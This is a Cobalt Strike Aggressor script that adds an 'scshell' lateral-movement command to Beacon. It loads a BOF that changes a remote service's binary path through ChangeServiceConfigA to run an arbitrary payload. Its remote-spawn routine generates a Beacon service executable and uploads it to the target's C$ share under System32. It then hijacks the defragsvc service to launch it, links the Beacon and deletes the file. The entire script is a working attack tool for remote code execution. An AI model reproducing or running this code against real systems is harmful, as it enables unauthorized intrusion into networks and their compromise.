sub bscshell {
    local('$barch $bofname $handle $data $args');
    $barch = barch($1);

    $bofname = "scshellbof.";
    if ($5 eq "imp")
    {
	$bofname = "$bofname $+ imp.";
    }
    $bofname = "$bofname $+ $barch $+ .o";

    $handle = openf(script_resource($bofname));
    $data   = readb($handle, -1);
    closef($handle);

    $args   = bof_pack($1, "zzz", $2, $3, $4);
    btask($1, "Running BOF SCShell ( $+ $bofname $+ )");
    beacon_inline_execute($1, $data, "go", $args);
}

alias scshell {
    if (size(@_) < 4)
    {
        berror($1, "Invalid number of arguments! (See 'help scshell')");
	return 1;
    }
    bscshell($1, $2, $3, $4, $5);
}

beacon_command_register(
    "scshell",
    "lateral movement using ChangeServiceConfigA API",
    "Use: scshell [target] [service] [payload] [imp]\n     scshell [target] [service] [payload]\n\nExecutes command `payload` on `target` by modifying the service binary path for `service` using the ChangeServiceConfigA API call\nAlso attempts to restore the original binary path of the service after executing the payload.\nOptionally impersonates the current process token (imp) or uses the logon session (attached to the process token) for authentication.");

sub scshell_remote_spawn {
    local('$name $exedata $service');

    $service = "defragsvc";

    btask($1, "Tasked Beacon to jump to $2 (" . listener_describe($3) . ") via SCShell", "T1569");
    $name = rand(@("malware", "evil", "detectme")) . rand(100) . ".exe";
    $exedata = artifact_payload($3, "svcexe", $arch);
    $exepath = "Windows\\System32\\ $+ $name";
    bupload_raw!($1, "\\\\ $+ $2 $+ \\C\$\\ $+ $exepath", $exedata);
    bscshell($1, $2, $service, "C:\\ $+ $exepath");
    beacon_link($1, $2, $3);
    brm($1, "\\\\ $+ $2 $+ \\C\$\\ $+ $exepath");
}

beacon_remote_exploit_register("scshell", "x86", "Use ChangeServiceConfigA to run Beacon payload", lambda(&scshell_remote_spawn, $arch => "x86"));
beacon_remote_exploit_register("scshell64", "x64", "Use ChangeServiceConfigA to run Beacon payload", lambda(&scshell_remote_spawn, $arch => "x64"));
